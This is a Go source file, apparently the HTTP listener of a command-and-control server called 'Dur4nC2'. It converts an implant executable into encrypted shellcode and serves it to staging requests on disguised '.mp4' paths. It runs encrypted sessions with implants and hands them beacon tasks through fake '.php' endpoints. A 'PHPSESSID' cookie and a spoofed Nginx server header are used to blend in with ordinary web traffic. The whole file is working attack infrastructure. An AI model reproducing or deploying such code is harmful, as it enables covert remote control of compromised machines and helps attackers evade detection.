package listener

import (
	"Dur4nC2/misc/crypto"
	"Dur4nC2/misc/protobuf/implantpb"
	"Dur4nC2/server/db"
	implantRepository "Dur4nC2/server/domain/implant/respository/postgres"
	"Dur4nC2/server/generate"
	implantHandlers "Dur4nC2/server/listener/handlers"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"github.com/gofrs/uuid"
	"github.com/gorilla/mux"
	"golang.org/x/crypto/nacl/box"
	"google.golang.org/protobuf/proto"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"sync"
	"time"
)

var (
	ErrDecodeFailed  = errors.New("failed to decode request")
	ErrDecryptFailed = errors.New("failed to decrypt request")
	implantRepo      = implantRepository.NewPosgresImplantRepository(db.Session())
)

const (
	DefaultMaxBodyLength = 2 * 1024 * 1024 * 1024 // 2Gb
	DefaultHTTPTimeout   = time.Minute
)

type HTTPListener struct {
	HTTPServer      *http.Server
	ServerConf      *HTTPListenerConfig // Server config (user args)
	HTTPConnections *HTTPConnections
	ImplantStage    []byte // shellcode to serve during staging process
	ImplantStageKey []byte
	ETag            string
	Cleanup         func()
}
type HTTPListenerConfig struct {
	Addr   string
	LPort  uint16
	Domain string

	IsStaged  bool
	StagePath string

	MaxRequestLength int
}
type HTTPConnection struct {
	ID        string
	CipherCtx *cryptography.CipherContext
	Started   time.Time
}
type HTTPConnections struct {
	active map[string]*HTTPConnection
	mutex  *sync.RWMutex
}

// Add - Add an HTTP session
func (s *HTTPConnections) Add(session *HTTPConnection) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	s.active[session.ID] = session
}

// Get - Get an HTTP session
func (s *HTTPConnections) Get(sessionID string) *HTTPConnection {
	s.mutex.RLock()
	defer s.mutex.RUnlock()
	return s.active[sessionID]
}

// Remove - Remove an HTTP session
func (s *HTTPConnections) Remove(sessionID string) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	delete(s.active, sessionID)
}

// *** entry point
func StartHTTPListener(conf *HTTPListenerConfig) (*HTTPListener, error) {
	var (
		shellcode []byte
		etagBytes uuid.UUID
		server    *HTTPListener
	)

	if conf.IsStaged {
		aesEncryptKey := cryptography.GenerateRandomString(16)
		fmt.Printf("[team-server] AES KEY: '%s'\n", aesEncryptKey)
		//TODO random 16, 24 or 32 byte length
		aesEncryptIv := cryptography.GenerateRandomString(16)
		fmt.Printf("[team-server] AES IV: '%s'\n", aesEncryptIv)

		etagBytes, _ = uuid.DefaultGenerator.NewV4()
		fmt.Println("[team-server] ETag: ", etagBytes.String())

		data, err := ioutil.ReadFile("/tmp/implant.exe")
		if err != nil {
			fmt.Println("[team-server] ERROR: ", err.Error())
			return nil, err
		}
		shellcode, err = generate.DonutShellcodeFromPEBytes(data, "x64", "", "", "", false, false)
		if err != nil {
			fmt.Println("[team-server] ERROR: ", err.Error())
			return nil, err
		}
		os.WriteFile("/tmp/stage.bin", shellcode, 0600)

		//encrypt
		shellcode = cryptography.PreludeEncrypt(shellcode, []byte(aesEncryptKey), []byte(aesEncryptIv))

		server = &HTTPListener{
			ServerConf: conf,
			HTTPConnections: &HTTPConnections{
				active: map[string]*HTTPConnection{},
				mutex:  &sync.RWMutex{},
			},
			ImplantStage:    shellcode,
			ImplantStageKey: []byte(aesEncryptKey),
			ETag:            etagBytes.String(),
		}
	} else {
		server = &HTTPListener{
			ServerConf: conf,
			HTTPConnections: &HTTPConnections{
				active: map[string]*HTTPConnection{},
				mutex:  &sync.RWMutex{},
			},
			ETag: etagBytes.String(),
		}
	}

	server.HTTPServer = &http.Server{
		Addr:         conf.Addr,
		Handler:      server.router(),
		WriteTimeout: DefaultHTTPTimeout,
		ReadTimeout:  DefaultHTTPTimeout,
	}
	server.Cleanup = func() {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		<-ctx.Done()
		if err := server.HTTPServer.Shutdown(ctx); err != nil {
			fmt.Println("Error: Failed shutdown the transport server")
		}
	}
	return server, nil
}

// *** routers
func (l *HTTPListener) router() *mux.Router {
	router := mux.NewRouter()
	if l.ServerConf.MaxRequestLength < 1024 {
		l.ServerConf.MaxRequestLength = DefaultMaxBodyLength
	}

	router.HandleFunc(
		"/articles/{id:[0-9]+}",
		l.startConnectionHandler,
	).Methods(http.MethodGet, http.MethodPost)

	// Session Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*%s$}", ".php"),
		l.connectionHandler,
	).Methods(http.MethodGet, http.MethodPost)

	// Close Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*%s$}", ".png"),
		l.closeHandler,
	).Methods(http.MethodGet)

	// Stage Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*%s$}", ".mp4"),
		l.stageHandler,
	).Methods(http.MethodGet)

	// Default handler returns 404
	router.HandleFunc("/{rpath:.*}",
		l.defaultHandler,
	).Methods(http.MethodGet, http.MethodPost)

	return router
}

// *** handlers controllers
func (l *HTTPListener) startConnectionHandler(resp http.ResponseWriter, req *http.Request) {
	msg, err := io.ReadAll(req.Body)
	if err != nil {
		fmt.Printf("Failed to read body %s\n", err)
		l.defaultHandler(resp, req)
		return
	}
	if len(msg) < 32 {
		fmt.Println(errors.New("data too short"))
		l.defaultHandler(resp, req)
		return
	}

	var publicKeyDigest [32]byte
	copy(publicKeyDigest[:], msg[:32])
	implantConfig, err := implantRepo.ReadByECCPlublicKeyDigest(&publicKeyDigest)
	if err != nil {
		fmt.Println("[team-server] Unknown public key!!!")
		l.defaultHandler(resp, req)
		return
	}
	publicKey, err := base64.RawStdEncoding.DecodeString(implantConfig.ECCPublicKey)
	privateKey, err := base64.RawStdEncoding.DecodeString(implantConfig.ECCPrivateKey)
	if err != nil || len(publicKey) != 32 {
		fmt.Println("Failed to decode public key")
		l.defaultHandler(resp, req)
		return
	}
	var senderPublicKey [32]byte
	copy(senderPublicKey[:], publicKey)
	var senderPrivateKey [32]byte
	copy(senderPrivateKey[:], privateKey)
	serverKeyPair := cryptography.ECCServerKeyPair()

	ciphertext := msg[32:]
	if len(ciphertext) < 24 {
		fmt.Println(errors.New("ciphertext too short"))
		l.defaultHandler(resp, req)
		return
	}
	var decryptNonce [24]byte
	copy(decryptNonce[:], ciphertext[:24])
	plaintextMsg, ok := box.Open(nil, ciphertext[24:], &decryptNonce, &senderPublicKey, serverKeyPair.Private)
	if !ok {
		fmt.Println("Decryption failed")
		l.defaultHandler(resp, req)
		return
	}

	httpSessionInit := &implantpb.HTTPSessionInit{}
	err = proto.Unmarshal(plaintextMsg, httpSessionInit)
	if err != nil {
		fmt.Println("Failed unmarshal...")
		l.defaultHandler(resp, req)
		return
	}

	if len(httpSessionInit.Key) < 24 {
		fmt.Println("Invalied key...")
		l.defaultHandler(resp, req)
		return
	}
	httpConnection := newHTTPConnection()
	sKey, err := cryptography.KeyFromBytes(httpSessionInit.GetKey())
	if err != nil {
		fmt.Println("Failed to convert bytes to session key")
		l.defaultHandler(resp, req)
		return
	}
	httpConnection.CipherCtx = cryptography.NewCipherContext(sKey)
	l.HTTPConnections.Add(httpConnection)
	fmt.Println("\n[team-server] New Connection with id: ", httpConnection.ID)
	responseCiphertext, err := httpConnection.CipherCtx.Encrypt([]byte(httpConnection.ID))
	if err != nil {
		fmt.Println("Failed to encrypt session identifier")
		l.defaultHandler(resp, req)
		return
	}
	http.SetCookie(resp, &http.Cookie{
		Domain:   l.ServerConf.Domain,
		Name:     l.getCookieName(),
		Value:    httpConnection.ID,
		Secure:   false,
		HttpOnly: true,
	})
	l.noCacheHeader(resp)
	_, err = resp.Write(responseCiphertext)
	if err != nil {
		fmt.Println("Failed to write...")
		l.defaultHandler(resp, req)
		return
	}
}
func (l *HTTPListener) defaultHandler(resp http.ResponseWriter, req *http.Request) {
	//fmt.Println("[team-server] Default handler...")
	resp.WriteHeader(http.StatusNotFound)
}
func (l *HTTPListener) connectionHandler(resp http.ResponseWriter, req *http.Request) {
	//fmt.Println("[team-server] Connection request")
	httpConnection := l.getHTTPConnection(req)
	if httpConnection == nil {
		l.defaultHandler(resp, req)
		return
	}
	var (
		envelope *implantpb.Envelope
	)
	if req.Method == http.MethodPost {
		plaintext, err := l.readReqBody(httpConnection, resp, req)
		if err != nil {
			fmt.Println("Failed to decode request body: ", err)
			l.defaultHandler(resp, req)
			return
		}
		envelope = &implantpb.Envelope{}
		err = proto.Unmarshal(plaintext, envelope)
		if err != nil {
			fmt.Println("Failed to deserialize body: ", err)
			l.defaultHandler(resp, req)
			return
		}

	} else if req.Method == http.MethodGet {
		beaconTasks := &implantpb.BeaconTasks{
			ID: req.Header.Get("ETag"),
		}
		beaconTasksData, _ := proto.Marshal(beaconTasks)
		envelope = &implantpb.Envelope{
			Type: implantpb.MsgBeaconTasks,
			Data: beaconTasksData,
		}
	}
	resp.WriteHeader(http.StatusAccepted)
	handlers := implantHandlers.GetHandlers()
	if handler, ok := handlers[envelope.Type]; ok {
		respEnvelope := handler(envelope.Data)
		respData, err := proto.Marshal(respEnvelope)
		if err != nil {
			fmt.Println("Failed marshal message ", err)
		}
		respEncrypted, err := httpConnection.CipherCtx.EncryptAES(respData)
		_, err = resp.Write(respEncrypted)
		if err != nil {
			return
		}
		//io.WriteString(resp, cryptography.EncryptAES(httpConnection.CipherCtx.Key, data))
		//resp.Write(data)
	}

}
func (l *HTTPListener) stageHandler(resp http.ResponseWriter, req *http.Request) {
	fmt.Println("[team-server] Stager request")
	//TODO set etag filter again
	if len(l.ImplantStage) != 0 && l.checkETag(req) {
		fmt.Println("[team-server] Received staging request from ", getRemoteAddr(req))
		l.noCacheHeader(resp)
		resp.Write(l.ImplantStage)
		fmt.Printf("Serving binary (size %d) to %s\n", len(l.ImplantStage), getRemoteAddr(req))
		resp.WriteHeader(http.StatusOK)
	} else {
		resp.WriteHeader(http.StatusNotFound)
	}
}
func (l *HTTPListener) noCacheHeader(resp http.ResponseWriter) {
	resp.Header().Add("Cache-Control", "no-store, no-cache, must-revalidate")
}
func (l *HTTPListener) DefaultRespHeaders(next http.Handler) http.Handler {
	fmt.Println("[*] Default resp header...")
	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
		resp.Header().Set("Server", "Nginx")
		next.ServeHTTP(resp, req)
	})
}
func (l *HTTPListener) getServerPollTimeout() {}
func (l *HTTPListener) closeHandler(resp http.ResponseWriter, req *http.Request) {
	fmt.Println("[*] Close request")
	httpConnection := l.getHTTPConnection(req)
	if httpConnection == nil {
		fmt.Printf("No session with id %#v\n", httpConnection.ID)
		l.defaultHandler(resp, req)
		return
	}
	for _, cookie := range req.Cookies() {
		cookie.MaxAge = -1
		http.SetCookie(resp, cookie)
	}
	l.HTTPConnections.Remove(httpConnection.ID)
	resp.WriteHeader(http.StatusAccepted)
}

// *** utils ***
func newHTTPConnection() *HTTPConnection {
	return &HTTPConnection{
		ID:      newHTTPSessionID(),
		Started: time.Now(),
	}
}

// newHTTPSessionID - Get a 128bit session ID
func newHTTPSessionID() string {
	buf := make([]byte, 16)
	rand.Read(buf)
	return hex.EncodeToString(buf)
}
func (l *HTTPListener) getCookieName() string {
	return "PHPSESSID"
}
func getRemoteAddr(req *http.Request) string {
	ipAddress := req.Header.Get("X-Real-Ip")
	if ipAddress == "" {
		ipAddress = req.Header.Get("X-Forwarded-For")
	}
	if ipAddress == "" {
		return req.RemoteAddr
	}

	// Try to parse the header as an IP address, as this is user controllable
	// input we don't want to trust it.
	ip := net.ParseIP(ipAddress)
	if ip == nil {
		fmt.Println("Failed to parse X-Header as ip address")
		return req.RemoteAddr
	}
	return fmt.Sprintf("tcp(%s)->%s", req.RemoteAddr, ip.String())
}
func (l *HTTPListener) checkETag(req *http.Request) bool {
	etag := req.Header.Get("ETag")
	if etag == l.ETag {
		return true
	}
	return false
}
func (l *HTTPListener) getHTTPConnection(req *http.Request) *HTTPConnection {
	for _, cookie := range req.Cookies() {
		httpSession := l.HTTPConnections.Get(cookie.Value)
		if httpSession != nil {
			return httpSession
		}
	}
	return nil // No valid cookie names
}
func (l *HTTPListener) readReqBody(httpConnection *HTTPConnection, resp http.ResponseWriter, req *http.Request) ([]byte, error) {
	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		fmt.Println("Failed to read request body ", err)
		return nil, err
	}

	plaintext, err := httpConnection.CipherCtx.DecryptAES(body)
	return plaintext, err
}
